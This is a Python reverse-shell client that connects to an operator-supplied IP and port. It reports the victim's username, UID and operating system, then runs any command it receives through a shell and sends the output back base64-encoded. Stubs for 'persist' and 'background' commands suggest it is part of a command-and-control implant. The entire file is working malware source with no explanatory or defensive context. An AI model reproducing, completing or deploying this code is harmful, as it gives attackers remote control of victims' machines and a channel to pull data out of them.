import base64
import socket
import subprocess
import os
import sys
import pwd
import platform
import time

def inbound():
    print('[+] Awaiting response...')
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except Exception:
            sock.close()

def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf-8'))
    sock.send(response)

def session_handler():
    try:
        print(f"[+] Connecting to {host_ip}.")
        sock.connect((host_ip, host_port))
        outbound(pwd.getpwuid(os.getuid())[0])
        outbound(os.getuid())
        time.sleep(5)
        op_sys = platform.uname()
        op_sys = (f'{op_sys[0]} {op_sys[2]}')
        outbound(op_sys)
        print(f"[+] Connected to {host_ip}.")
        while True:
            message = inbound()
            print(f'[+] Message received - {message}')
            if message == 'exit':
                print('[-] The server has terminated the session.')
                sock.close()
                break
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    current_dir = os.getcwd()
                    print(f"[+] Changed to {current_dir}")
                    outbound(current_dir)
                except FileNotFoundError:
                    outbound('Invalid directory. Try again.')
                    continue
            elif message == 'background':
                pass
            elif message == 'persist':
                pass
            elif message == 'help':
                pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
    except ConnectionRefusedError:
        pass

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = 'INPUT_IP_HERE'
        host_port = INPUT_PORT_HERE
        session_handler()
    except IndexError:
        print('[-] Command line arguments(s) missing. Please try again.')
    except Exception as e:
        print(e)
